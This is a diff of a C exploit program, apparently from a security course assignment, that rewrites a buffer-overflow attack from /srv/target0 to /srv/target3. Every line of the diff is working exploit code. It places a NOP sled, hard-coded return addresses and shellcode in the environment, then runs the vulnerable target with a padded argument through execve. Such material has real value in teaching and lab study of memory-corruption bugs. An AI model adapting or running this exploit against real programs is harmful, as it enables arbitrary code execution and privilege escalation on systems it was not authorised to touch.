@@ -5,34 +5,34 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* target = "/srv/target0";
+const char* TARGET = "/srv/target3";
+const int ENVSIZE = 400;
+const uint32_t BASEADDR = 0xffffdec0;
+const int NOPSIZE = 201;
+const char NOP = 0x90;
+const int RETOFFSET = 4;
 
-const int psize = 408;
-const int ssize = sizeof(shellcode) - 1;
-const uint32_t retaddr = 0xffffdb2c;
+const uint32_t StartAddr = BASEADDR + RETOFFSET;
+const uint32_t SecondAddr = BASEADDR + 2 * RETOFFSET;
+const char Pad[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
-void craft(char *p) {
-    memset(p, 0x90, psize);
-    p[psize] = '\0';
-    memcpy(p, shellcode, ssize);
-    *(uint32_t*)(p + psize - 4) = retaddr;
+void prepEnv(char *env) {
+    memset(env, NOP, ENVSIZE - 1);
+    *((uint32_t *)(env)) = StartAddr;
+    *((uint32_t *)(env + RETOFFSET)) = SecondAddr;
+    memcpy(env + NOPSIZE, shellcode, sizeof(shellcode));
+    env[ENVSIZE - 1] = '\0';
 }
 
-int main(void)
-{
-    char *a[3];
-    char *e[1];
-    char p[psize + 1];
+int main(void) {
+    char *args[] = {TARGET, Pad, NULL};
+    static char env[ENVSIZE];
 
-    craft(p);
+    prepEnv(env);
 
-    a[0] = target;
-    a[1] = p;
-    a[2] = NULL;
+    char *envp[] = {env};
 
-    e[0] = NULL;
-
-    execve(target, a, e);
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
